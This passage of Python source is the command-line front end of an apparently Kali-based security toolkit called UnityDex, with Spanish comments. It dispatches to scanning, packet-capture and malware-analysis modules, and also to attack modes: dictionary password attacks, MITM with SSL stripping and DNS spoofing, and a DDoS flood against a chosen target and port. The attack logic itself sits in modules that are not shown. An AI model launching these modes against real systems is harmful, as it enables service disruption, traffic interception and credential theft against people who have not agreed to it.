    iot_parser.add_argument('-p', '--ports', default='23,80,443,1883,5683,8080,8883,9000', help='Puertos a escanear (ej: 23,80,443 o 1-1000)')
    iot_parser.add_argument('-d', '--deep-scan', action='store_true', help='Realizar escaneo profundo de vulnerabilidades')
    iot_parser.add_argument('-z', '--zigbee', action='store_true', help='Incluir análisis de protocolos ZigBee')
    iot_parser.add_argument('-m', '--mqtt', action='store_true', help='Incluir análisis de protocolos MQTT')
    iot_parser.add_argument('-c', '--coap', action='store_true', help='Incluir análisis de protocolos CoAP')
    iot_parser.add_argument('-o', '--output', default=f'iot_scan_{int(time.time())}.json', help='Archivo de salida para el informe')
    
    # Modo de análisis avanzado de malware
    adv_malware_parser = subparsers.add_parser('adv_malware', help='Análisis avanzado de malware')
    adv_malware_parser.add_argument('-f', '--file', required=True, help='Ruta al archivo a analizar')
    adv_malware_parser.add_argument('-s', '--static', action='store_true', help='Realizar solo análisis estático')
    adv_malware_parser.add_argument('-d', '--dynamic', action='store_true', help='Realizar solo análisis dinámico')
    adv_malware_parser.add_argument('-y', '--yara', help='Ruta a reglas YARA personalizadas')
    adv_malware_parser.add_argument('-v', '--virustotal', action='store_true', help='Verificar en VirusTotal')
    adv_malware_parser.add_argument('-o', '--output', default=f'malware_analysis_{int(time.time())}.json', help='Archivo de salida para el informe')
    adv_malware_parser.add_argument('--format', choices=['json', 'txt', 'html'], default='json', help='Formato del informe')
    
    # Modo de ataque DDoS
    ddos_parser = subparsers.add_parser('ddos', help='Ataque DDoS (solo con fines educativos)')
    ddos_parser.add_argument('-t', '--target', required=True, help='Objetivo (IP o dominio)')
    ddos_parser.add_argument('-p', '--port', type=int, required=True, help='Puerto objetivo')
    ddos_parser.add_argument('-m', '--method', choices=['syn', 'udp', 'http', 'icmp'], default='syn', help='Método de ataque')
    ddos_parser.add_argument('-d', '--duration', type=int, default=60, help='Duración en segundos')
    ddos_parser.add_argument('--threads', type=int, default=10, help='Número de hilos a utilizar')
    
    args = parser.parse_args()
    
    # Mostrar banner
    print_banner()
    
    # Verificar versión
    if args.version:
        print(f"{COLORS['WHITE']}UnityDex versión {VERSION}{COLORS['ENDC']}")
        sys.exit(0)
    
    # Verificar si se está ejecutando como root
    check_root()
    
    # Verificar si se está ejecutando en Kali Linux
    check_kali()
    
    # Verificar dependencias
    if not args.no_check:
        check_dependencies()
    
    # Cargar configuración
    config = load_config()
    
    # Detectar interfaz automáticamente si se solicita
    if args.auto_interface or (config['general'].get('auto_detect_interface', False) and not args.mode):
        default_interface = get_default_interface()
        if default_interface:
            print(f"{COLORS['INFO']}[*] Interfaz detectada automáticamente: {default_interface}{COLORS['ENDC']}")
    
    # Modo de configuración
    if args.config:
        # Función para el menú de configuración
        def config_menu():
            print(f"\n{COLORS['WHITE']}=== Configuración de UnityDex ==={COLORS['ENDC']}")
            
            # Cargar configuración actual
            config = load_config()
            
            while True:
                print(f"\n{COLORS['INFO']}Opciones de configuración:{COLORS['ENDC']}")
                print(f"1. Configuración general")
                print(f"2. Configuración de escaneo de red")
                print(f"3. Configuración de captura de paquetes")
                print(f"4. Configuración de análisis web")
                print(f"5. Configuración de ataques MITM")
                print(f"6. Configuración de análisis de malware")
                print(f"0. Guardar y salir")
                
                try:
                    option = int(input(f"\n{COLORS['WHITE']}Seleccione una opción: {COLORS['ENDC']}"))
                    
                    if option == 0:
                        # Guardar configuración
                        with open('config.json', 'w') as f:
                            json.dump(config, f, indent=4)
                        print(f"\n{COLORS['SUCCESS']}Configuración guardada correctamente{COLORS['ENDC']}")
                        break
                    elif option == 1:
                        # Configuración general
                        print(f"\n{COLORS['WHITE']}=== Configuración General ==={COLORS['ENDC']}")
                        
                        if 'general' not in config:
                            config['general'] = {}
                        
                        # Modo interactivo por defecto
                        interactive = input(f"Iniciar en modo interactivo por defecto (s/n) [{config['general'].get('interactive_mode', False) and 's' or 'n'}]: ").lower()
                        config['general']['interactive_mode'] = interactive.startswith('s')
                        
                        # Detección automática de interfaz
                        auto_interface = input(f"Detectar interfaz automáticamente (s/n) [{config['general'].get('auto_detect_interface', False) and 's' or 'n'}]: ").lower()
                        config['general']['auto_detect_interface'] = auto_interface.startswith('s')
                        
                        # Verificación de dependencias
                        check_deps = input(f"Verificar dependencias al inicio (s/n) [{config['general'].get('check_dependencies', True) and 's' or 'n'}]: ").lower()
                        config['general']['check_dependencies'] = not check_deps.startswith('n')
                    elif option == 2:
                        # Configuración de escaneo de red
                        print(f"\n{COLORS['WHITE']}=== Configuración de Escaneo de Red ==={COLORS['ENDC']}")
                        
                        if 'network_scan' not in config:
                            config['network_scan'] = {}
                        
                        # Método de escaneo por defecto
                        method = input(f"Método de escaneo por defecto (quick/full/vuln) [{config['network_scan'].get('default_method', 'quick')}]: ").lower()
                        if method in ['quick', 'full', 'vuln']:
                            config['network_scan']['default_method'] = method
                        
                        # Puertos a escanear
                        ports = input(f"Puertos a escanear por defecto [{config['network_scan'].get('default_ports', 'common')}]: ").lower()
                        config['network_scan']['default_ports'] = ports or 'common'
                    elif option == 3:
                        # Configuración de captura de paquetes
                        print(f"\n{COLORS['WHITE']}=== Configuración de Captura de Paquetes ==={COLORS['ENDC']}")
                        
                        if 'packet_capture' not in config:
                            config['packet_capture'] = {}
                        
                        # Duración por defecto
                        duration = input(f"Duración por defecto en segundos [{config['packet_capture'].get('default_duration', 60)}]: ")
                        try:
                            config['packet_capture']['default_duration'] = int(duration)
                        except:
                            config['packet_capture']['default_duration'] = 60
                        
                        # Filtro por defecto
                        filter_expr = input(f"Filtro por defecto [{config['packet_capture'].get('default_filter', '')}]: ")
                        config['packet_capture']['default_filter'] = filter_expr
                    elif option == 4:
                        # Configuración de análisis web
                        print(f"\n{COLORS['WHITE']}=== Configuración de Análisis Web ==={COLORS['ENDC']}")
                        
                        if 'web_scan' not in config:
                            config['web_scan'] = {}
                        
                        # Profundidad de escaneo
                        depth = input(f"Profundidad de escaneo (1-5) [{config['web_scan'].get('scan_depth', 2)}]: ")
                        try:
                            depth = int(depth)
                            if 1 <= depth <= 5:
                                config['web_scan']['scan_depth'] = depth
                        except:
                            config['web_scan']['scan_depth'] = 2
                        
                        # Timeout por defecto
                        timeout = input(f"Timeout por defecto en segundos [{config['web_scan'].get('timeout', 10)}]: ")
                        try:
                            config['web_scan']['timeout'] = int(timeout)
                        except:
                            config['web_scan']['timeout'] = 10
                    elif option == 5:
                        # Configuración de ataques MITM
                        print(f"\n{COLORS['WHITE']}=== Configuración de Ataques MITM ==={COLORS['ENDC']}")
                        
                        if 'mitm_attack' not in config:
                            config['mitm_attack'] = {}
                        
                        # Herramienta por defecto
                        tool = input(f"Herramienta por defecto (arpspoof/ettercap/bettercap) [{config['mitm_attack'].get('default_tool', 'arpspoof')}]: ").lower()
                        if tool in ['arpspoof', 'ettercap', 'bettercap']:
                            config['mitm_attack']['default_tool'] = tool
                        
                        # SSL Strip por defecto
                        ssl_strip = input(f"Habilitar SSL Strip por defecto (s/n) [{config['mitm_attack'].get('ssl_strip', False) and 's' or 'n'}]: ").lower()
                        config['mitm_attack']['ssl_strip'] = ssl_strip.startswith('s')
                    elif option == 6:
                        # Configuración de análisis de malware
                        print(f"\n{COLORS['WHITE']}=== Configuración de Análisis de Malware ==={COLORS['ENDC']}")
                        
                        if 'malware_analysis' not in config:
                            config['malware_analysis'] = {}
                        
                        # API Key de VirusTotal
                        vt_api_key = input(f"API Key de VirusTotal [{config['malware_analysis'].get('virustotal_api_key', '')}]: ")
                        config['malware_analysis']['virustotal_api_key'] = vt_api_key
                        
                        # Sandbox por defecto
                        sandbox = input(f"Habilitar análisis en sandbox por defecto (s/n) [{config['malware_analysis'].get('sandbox_analysis', False) and 's' or 'n'}]: ").lower()
                        config['malware_analysis']['sandbox_analysis'] = sandbox.startswith('s')
                    else:
                        print(f"\n{COLORS['WARNING']}Opción inválida{COLORS['ENDC']}")
                except ValueError:
                    print(f"\n{COLORS['WARNING']}Entrada inválida{COLORS['ENDC']}")
                except KeyboardInterrupt:
                    print(f"\n\n{COLORS['WARNING']}Configuración cancelada{COLORS['ENDC']}")
                    return
        
        config_menu()
        sys.exit(0)
    
    # Modo interactivo
    if args.interactive or (config['general'].get('interactive_mode', False) and not args.mode):
        interactive_mode()
        sys.exit(0)
    
    # Ejecutar el modo seleccionado
    if args.mode == 'scan':
        network_scan(args.target, args.method)
    elif args.mode == 'vuln':
        network_vulnerability_scan(args.target, args.scan_type)
    elif args.mode == 'malware':
        malware_analysis(args.file)
    elif args.mode == 'capture':
        # Importar y ejecutar la captura de paquetes
        try:
            from packet_capture import PacketCapture
            
            print(f"{COLORS['BLUE']}[*] Iniciando captura de paquetes en {args.interface}{COLORS['ENDC']}")
            
            # Crear directorio de resultados si no existe
            output_dir = os.path.dirname(args.output)
            if output_dir and not os.path.exists(output_dir):
                os.makedirs(output_dir)
            
            # Configurar captura
            capture = PacketCapture({
                'interface': args.interface,
                'filter': args.filter,
                'timeout': args.duration,
                'verbose': True,
                'store_packets': True
            })
            
            # Iniciar captura
            print(f"{COLORS['GREEN']}[+] Capturando paquetes durante {args.duration} segundos{COLORS['ENDC']}")
            capture.start_capture()
            
            try:
                # Esperar a que termine la captura
                time.sleep(args.duration)
            except KeyboardInterrupt:
                print(f"\n{COLORS['WARNING']}[!] Captura interrumpida por el usuario{COLORS['ENDC']}")
            finally:
                capture.stop()
                capture.save_pcap(args.output)
                print(f"{COLORS['SUCCESS']}[+] Captura guardada en {args.output}{COLORS['ENDC']}")
                capture.print_stats()
        except ImportError:
            print(f"{COLORS['FAIL']}[!] No se pudo importar el módulo de captura de paquetes{COLORS['ENDC']}")
    elif args.mode == 'web':
        # Importar y ejecutar el escáner de vulnerabilidades web
        try:
            from web_scanner import WebScanner
            
            print(f"{COLORS['BLUE']}[*] Iniciando análisis de vulnerabilidades web en {args.url}{COLORS['ENDC']}")
            
            # Crear escáner
            scanner = WebScanner({
                'url': args.url,
                'verbose': True
            })
            
            # Iniciar escaneo
            scanner.scan()
            scanner.print_results()
            
            # Guardar resultados
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = f"results/web_scan_{timestamp}.json"
            scanner.save_results(output_file)
            print(f"{COLORS['SUCCESS']}[+] Resultados guardados en {output_file}{COLORS['ENDC']}")
        except ImportError:
            print(f"{COLORS['FAIL']}[!] No se pudo importar el módulo de escaneo web{COLORS['ENDC']}")
    elif args.mode == 'dict':
        # Importar y ejecutar el ataque de diccionario
        try:
            from dictionary_attack import dictionary_attack
            
            print(f"{COLORS['BLUE']}[*] Iniciando ataque de diccionario contra {args.target} ({args.service}){COLORS['ENDC']}")
            dictionary_attack(args.target, args.service, args.username, args.wordlist)
        except ImportError:
            print(f"{COLORS['FAIL']}[!] No se pudo importar el módulo de ataques de diccionario{COLORS['ENDC']}")
    elif args.mode == 'wifi':
        # Importar y ejecutar el escáner de redes inalámbricas
        try:
            from wireless_scanner import WirelessScanner
            
            print(f"{COLORS['BLUE']}[*] Iniciando escaneo de redes inalámbricas con {args.interface}{COLORS['ENDC']}")
            
            # Crear directorio de resultados si no existe
            if not os.path.exists(args.output):
                os.makedirs(args.output)
            
            # Crear escáner
            scanner = WirelessScanner({
                'interface': args.interface,
                'scan_time': args.time
            })
            
            # Iniciar escaneo
            scanner.start_scan()
            scanner.print_results()
            
            # Guardar resultados
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = os.path.join(args.output, f"wireless_scan_{timestamp}.json")
            scanner.save_results(output_file)
            print(f"{COLORS['SUCCESS']}[+] Resultados guardados en {output_file}{COLORS['ENDC']}")
        except ImportError:
            print(f"{COLORS['FAIL']}[!] No se pudo importar el módulo de escaneo inalámbrico{COLORS['ENDC']}")
    elif args.mode == 'mitm':
        # Importar y ejecutar el ataque MITM
        try:
            from mitm_attack import MITMAttack
            
            print(f"{COLORS['BLUE']}[*] Iniciando ataque MITM entre {args.target} y {args.gateway}{COLORS['ENDC']}")
            
            # Crear directorio de resultados si no existe
            output_dir = 'results'
            if not os.path.exists(output_dir):
                os.makedirs(output_dir)
            
            # Crear objeto de ataque
            attack = MITMAttack({
                'interface': args.interface,
                'target_ip': args.target,
                'gateway_ip': args.gateway,
                'attack_type': args.attack,
                'ssl_strip': args.ssl,
                'dns_spoof': args.dns,
                'packet_capture': args.pcap,
                'duration': args.duration
            })
            
            # Iniciar ataque
            attack.start()
            
            try:
                # Esperar a que termine el ataque
                if args.duration:
                    time.sleep(args.duration)
                else:
                    print(f"{COLORS['INFO']}[*] Presione Ctrl+C para detener el ataque{COLORS['ENDC']}")
                    while True:
                        time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n{COLORS['WARNING']}[!] Ataque interrumpido por el usuario{COLORS['ENDC']}")
            finally:
                attack.stop()
                attack.print_results()
                
                # Guardar resultados
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                output_file = os.path.join(output_dir, f"mitm_attack_{timestamp}.json")
                attack.save_results(output_file)
                print(f"{COLORS['SUCCESS']}[+] Resultados guardados en {output_file}{COLORS['ENDC']}")
        except ImportError:
            print(f"{COLORS['FAIL']}[!] No se pudo importar el módulo de ataques MITM{COLORS['ENDC']}")
    elif args.mode == 'ssl':
        ssl_analysis(args.interface, args.target, args.gateway, args.attack, args.duration)
    elif args.mode == 'port':
        advanced_port_scan(args.target, args.ports, args.timing, args.scan_type, args.service, args.os, args.output)
    elif args.mode == 'report':
        generate_report(args.output, args.system, args.network, args.scans, args.vulns)
    elif args.mode == 'iot':
        # Importar y ejecutar el escáner de seguridad IoT
        try:
            # Importar las funciones simplificadas del escáner IoT
            if args.deep_scan:
                from iot_scanner import deep_scan as iot_scan
            else:
                from iot_scanner import quick_scan as iot_scan
            
            print(f"{COLORS['BLUE']}[*] Iniciando análisis de seguridad IoT en {args.target}{COLORS['ENDC']}")
            
            # Crear directorio de resultados si no existe
            output_dir = os.path.dirname(args.output)
            if output_dir and not os.path.exists(output_dir):
                os.makedirs(output_dir)
            
            # Determinar el formato de salida basado en la extensión del archivo
            output_format = 'text'
            if args.output:
                if args.output.endswith('.json'):
                    output_format = 'json'
                elif args.output.endswith('.html'):
                    output_format = 'html'
            
            # Iniciar escaneo con la función simplificada
            print(f"{COLORS['INFO']}[*] Escaneando dispositivos IoT...{COLORS['ENDC']}")
            
            # Si es un escaneo profundo, mostrar mensaje adicional
            if args.deep_scan:
                print(f"{COLORS['INFO']}[*] Se realizará un análisis profundo de vulnerabilidades...{COLORS['ENDC']}")
            
            # Ejecutar el escaneo con las opciones adecuadas
            results = iot_scan(
                target=args.target,
                output=args.output,
                format=output_format
            )
            
            if results:
                print(f"{COLORS['SUCCESS']}[+] Escaneo completado con éxito{COLORS['ENDC']}")
                if args.output:
                    print(f"{COLORS['SUCCESS']}[+] Resultados guardados en {args.output}{COLORS['ENDC']}")
            else:
                print(f"{COLORS['WARNING']}[!] No se encontraron dispositivos IoT{COLORS['ENDC']}")
        except ImportError:
            print(f"{COLORS['FAIL']}[!] No se pudo importar el módulo de análisis de seguridad IoT{COLORS['ENDC']}")
    elif args.mode == 'adv_malware':
        # Importar y ejecutar el analizador avanzado de malware
        try:
            from malware_analyzer import MalwareAnalyzer
            
            print(f"{COLORS['BLUE']}[*] Iniciando análisis avanzado de malware: {args.file}{COLORS['ENDC']}")
            
            # Verificar que el archivo existe
            if not os.path.exists(args.file):
                print(f"{COLORS['FAIL']}[!] El archivo {args.file} no existe{COLORS['ENDC']}")
                return
            
            # Crear directorio de resultados si no existe
            output_dir = os.path.dirname(args.output)
            if output_dir and not os.path.exists(output_dir):
                os.makedirs(output_dir)
            
            # Configurar opciones de análisis
            analysis_options = {
                'file_path': args.file,
                'static_only': args.static,
                'dynamic_only': args.dynamic,
                'yara_rules': args.yara,
                'virustotal': args.virustotal,
                'output_format': args.format
            }
            
            # Crear analizador
            analyzer = MalwareAnalyzer(analysis_options)
            
            # Realizar análisis
            print(f"{COLORS['INFO']}[*] Analizando archivo...{COLORS['ENDC']}")
            analyzer.analyze()
            
            # Mostrar resultados
            analyzer.print_results()
            
            # Guardar resultados
            analyzer.save_report(args.output)
            print(f"{COLORS['SUCCESS']}[+] Informe guardado en {args.output}{COLORS['ENDC']}")
        except ImportError:
            print(f"{COLORS['FAIL']}[!] No se pudo importar el módulo de análisis avanzado de malware{COLORS['ENDC']}")
    elif args.mode == 'ddos':
        ddos_attack(args.target, args.port, args.method, args.duration, args.threads)

# Llamar a la función principal si se ejecuta directamente
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{COLORS['WARNING']}[!] Programa interrumpido por el usuario{COLORS['ENDC']}")
    except Exception as e:
        print(f"\n{COLORS['FAIL']}[!] Error: {str(e)}{COLORS['ENDC']}")
        import traceback
        traceback.print_exc()